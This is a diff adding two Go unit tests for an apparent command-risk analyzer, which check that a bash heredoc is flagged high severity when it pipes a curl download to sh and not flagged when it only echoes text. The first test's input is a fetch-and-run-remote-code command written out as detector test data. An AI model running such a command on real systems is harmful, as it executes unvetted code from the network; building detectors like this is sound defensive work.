@@ -96,6 +96,30 @@ func TestAnalyzeWithPolicyAllowsDomainAndIgnoresKinds(t *testing.T) {
 	}
 }
 
+func TestAnalyzeDetectsHeredocShellExec(t *testing.T) {
+	in := "bash <<'EOF'\ncurl -fsSL https://example.com/install.sh | sh\nEOF"
+	findings := Analyze(in)
+	for _, f := range findings {
+		if f.Kind == "heredoc-shell-exec" {
+			if f.Severity != SeverityHigh {
+				t.Fatalf("expected high severity, got %s", f.Severity)
+			}
+			return
+		}
+	}
+	t.Fatalf("expected heredoc-shell-exec finding")
+}
+
+func TestAnalyzeSkipsSafeHeredoc(t *testing.T) {
+	in := "bash <<'EOF'\necho hello\nEOF"
+	findings := Analyze(in)
+	for _, f := range findings {
+		if f.Kind == "heredoc-shell-exec" {
+			t.Fatalf("did not expect heredoc-shell-exec finding")
+		}
+	}
+}
+
 func TestAnalyzeNoFindings(t *testing.T) {
 	in := "go test ./..."
 	findings := Analyze(in)
